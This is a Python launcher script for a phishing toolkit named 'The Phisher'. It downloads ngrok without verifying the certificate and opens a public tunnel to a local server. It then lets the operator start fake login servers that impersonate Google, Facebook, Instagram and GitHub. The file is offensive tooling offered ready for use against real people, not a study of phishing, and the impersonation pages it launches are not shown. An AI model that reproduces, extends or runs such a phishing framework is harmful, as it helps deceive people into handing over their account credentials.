# Mr. Robot
# The Phishing Framework
# Author : Thehackersbrain [Gaurav Raj]
# Website : https://thehackersbrain.pythonanywhere.com/

from termcolor import colored
from os import system, listdir, mkdir
import pyfiglet
from time import sleep
import json

def ctarget():
	if "targets" not in listdir():
		system("chmod +x setup.sh")
		mkdir("targets")

def banner():
	banner = pyfiglet.figlet_format(' The Phisher', font='slant')
	author = f"            Author : {colored('TheHackersBrain', 'green')} {colored('[Gaurav Raj]', 'green')}"
	print(colored(banner, 'green'),author+"\n")

def sites():
	sites = f"""{colored('1', 'yellow')} > {colored('Google', 'green')}
{colored('2', 'yellow')} > {colored('Facebook', 'green')}
{colored('3', 'yellow')} > {colored('Instagram', 'green')}
{colored('4', 'yellow')} > {colored('GitHub', 'green')}"""
	print(sites)

def ngrok_check():
    if 'ngrok' in listdir():
        pass
    else:
        print(
            f"\n{colored('[', 'green')}-{colored(']', 'green')} Ngrok not found, Downloading Ngrok...")
        print(f"""\n----- Device Type ------
{colored('[', 'green')}01{colored(']', 'green')} {colored('Android', 'yellow')}
{colored('[', 'green')}02{colored(']', 'green')} {colored('PC, Laptop', 'yellow')}
{colored('[', 'green')}03{colored(']', 'green')} {colored('Raspberry PI or Other SBC', 'yellow')}
""")
        choice = input(
            f"{colored('[', 'green')}+{colored('] Choose Device Type : ', 'green')}")
        if choice == "1" or choice == "01":
            print(
                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'green')}")
            system(
                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1')
            system('unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1')
            system('chmod +x ngrok')
            system('rm -rf ngrok-stable-linux-arm.zip')
            ngrok_portfwd()
        elif choice == "2" or choice == "02":
            print(
                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'green')}")
            system(
                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1')
            system('unzip ngrok-stable-linux-386.zip > /dev/null 2>&1')
            system('chmod +x ngrok')
            system('rm -rf ngrok-stable-linux-386.zip')
            ngrok_portfwd()
        elif choice == "3" or choice == "03":
            print(
                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'green')}")
            system(
                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1')
            system('unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1')
            system('chmod +x ngrok')
            system('rm -rf ngrok-stable-linux-arm.zip')
            ngrok_portfwd()
        else:
            print("Invalid Input, Try Again...")


def ngrok_portfwd():
    system("./ngrok http 5000 > /dev/null &")
    sleep(10)
    system("curl http://localhost:4040/api/tunnels > tunnels.json")

    with open('tunnels.json') as data_file:
        datajson = json.load(data_file)

    link = ""
    for i in datajson['tunnels']:
        link = link + i['public_url'] + '\n'
    print(
        f"""{colored('[', 'green')}+{colored('] Direct Link: ', 'green')} {colored(link[29:], 'yellow')}""")

if __name__ == '__main__':
	try:
		ctarget()
		banner()
		ngrok_check()
		sites()
		ngrok_portfwd()
		print()
		site_opt = input(f"{colored('[', 'green')}{colored('x', 'red')}{colored(']', 'green')} {colored('Enter Number : ', 'green')}")
		if site_opt == "1":
			print(f"\n{colored('Starting Google Server...', 'green')}" + "\n")
			system("python3 websites/google.py")
		elif site_opt == "2":
			print(f"\n{colored('Starting Facebook Server...', 'green')}" + "\n")
			system("python3 websites/facebook.py")
		elif site_opt == "3":
			print(f"\n{colored('Starting Instagram Server...', 'green')}" + "\n")
			system("python3 websites/instagram.py")
		elif site_opt == "4":
			print(f"\n{colored('Starting GitHub Server...', 'green')}" + "\n")
			system("python3 websites/github.py")
		else:
			print('Invalid Option, Please Enter a Valid Number...')
			exit()
	except KeyboardInterrupt as keyerr:
		print(f"\nKeyboard Interrupt Detected. Exiting...")
	except EOFError as ef:
		print(f"\nKeyboard Interrupt Detected. Exiting...")
